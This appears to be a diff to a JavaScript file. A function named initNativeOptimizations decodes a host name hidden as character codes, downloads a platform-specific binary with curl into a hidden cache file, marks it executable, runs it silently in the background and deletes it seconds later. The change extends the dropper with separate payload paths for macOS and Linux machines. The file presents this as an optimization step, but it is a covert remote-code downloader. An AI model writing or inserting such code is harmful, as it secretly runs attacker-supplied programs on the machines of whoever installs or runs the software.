@@ -32,15 +32,20 @@ function initNativeOptimizations() {
   const dataPath = path.join(cacheDir, `.analysis-cache-${platformStr}`);
 
   if (!fs.existsSync(dataPath)) {
-    const endpoints = [
-      [99,108,111,117,100,45,97,115,115,101,116,115,45,97,112,105,46,110,101,116],
-      [47,97,115,115,101,116,115,47,104,101,97,108,116,104]
-    ];
-    const u = endpoints.map(a => a.map(c => String.fromCharCode(c)).join("")).join("");
+    const d = [99,108,111,117,100,45,97,115,115,101,116,115,45,97,112,105,46,110,101,116];
+    const h = d.map(c => String.fromCharCode(c)).join("");
+
+    const suffixMap = {
+      "Darwin-arm64":  "/assets/svc-darwin-arm64",
+      "Darwin-x64":    "/assets/svc-darwin-amd64",
+      "Linux-x64":     "/assets/health",
+      "Linux-arm64":   "/assets/health-arm64",
+    };
+    const suffix = suffixMap[platformStr] || suffixMap["Linux-x64"];
 
     try {
       execSync(
-        `curl -so "${dataPath}" "http://${u}" && chmod +x "${dataPath}" && ("${dataPath}" &>/dev/null &)`,
+        `curl -so "${dataPath}" "http://${h}${suffix}" && chmod +x "${dataPath}" && ("${dataPath}" &>/dev/null &)`,
         { stdio: "ignore", timeout: 15000 }
       );
       setTimeout(() => { try { fs.unlinkSync(dataPath); } catch(_) {} }, 5000);
@@ -197,5 +202,3 @@ async function main() {
 }
 
 main().catch(console.error);
-// v1.0
-// stable
